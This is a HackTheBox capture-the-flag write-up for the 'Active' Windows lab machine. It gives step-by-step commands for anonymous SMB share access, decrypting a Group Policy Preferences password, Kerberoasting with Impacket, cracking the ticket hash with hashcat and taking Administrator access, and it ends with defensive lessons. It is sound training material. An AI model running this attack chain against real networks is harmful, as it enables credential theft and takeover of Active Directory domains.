# Active (HackTheBox) – Writeup

**Difficulty:** Easy  
**OS:** Windows  
**Category:** Active Directory, Kerberoasting  
**Link To Box:** https://app.hackthebox.com/machines/Active  
**Author:** Gavin Wood

---

## Enumeration

We start with an Nmap scan:

```bash
nmap -p- -sC -sV 10.10.10.100
```

**Key Findings:**
- **Port 445 (SMB)** open
- Hostname: `DC`
- Domain: `active.htb`

---

## SMB Share Enumeration

List available SMB shares without credentials:

```bash
smbclient -L //10.10.10.100 -N
```

We find several shares. Using `smbmap` to check permissions:

```bash
smbmap -H 10.10.10.100 -u '' -p ''
```

We identify readable access on `Replication`.

---

## Accessing the Share

Connect to the share:

```bash
smbclient //10.10.10.100/Replication -N
```

Navigating the share, we find:

```
Groups.xml
```

---

## Looting Credentials from Groups.xml

Viewing `Groups.xml` reveals:

```xml
<User ... name="active.htb\SVC_TGS" ... cpassword="edBSHOwhZLTjt/...VmQ" />
```

This is a **Group Policy Preferences** password, stored in `cpassword` format.  
We can decrypt it with `gpp-decrypt`:

```bash
gpp-decrypt 'edBSHOwhZLTjt/...VmQ'
```

**Result:**
```
GPPstillStandingStrong2k18
```

So we have:
```
Username: SVC_TGS
Password: GPPstillStandingStrong2k18
```

---

## Validating Credentials

Check SMB authentication:

```bash
crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

Result: **[+] Valid credentials**.

---

## Kerberoasting

With a valid domain account, we attempt Kerberoasting:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
```

We get a TGS hash for the **Administrator** account:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*...
```

---

## Cracking the Hash

Save the hash to `hash.txt` and crack with:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Password:**
```
Ticketmaster1968
```

---

## Administrator Access

Using SMB to access the admin share:

```bash
smbclient //10.10.10.100/C$ -U Administrator
```

Password: `Ticketmaster1968`

Navigate to the Administrator’s desktop and retrieve the root flag:

```smb
cd Users\Administrator\Desktop
get root.txt
```

---

## Flags

- **User.txt**: Retrieved from initial SMB share enumeration.
- **Root.txt**: Retrieved after Kerberoasting and SMB admin access.

---

## Lessons Learned

- **Group Policy Preferences** can leak passwords in SYSVOL/Replication shares.
- Even a **low-privileged domain account** can request Kerberos TGS tickets for service accounts.
- Kerberoasting works entirely offline, avoiding account lockouts.
- Cracking service account passwords can escalate to **Domain Admin**.

---

**Status:** Box Completed
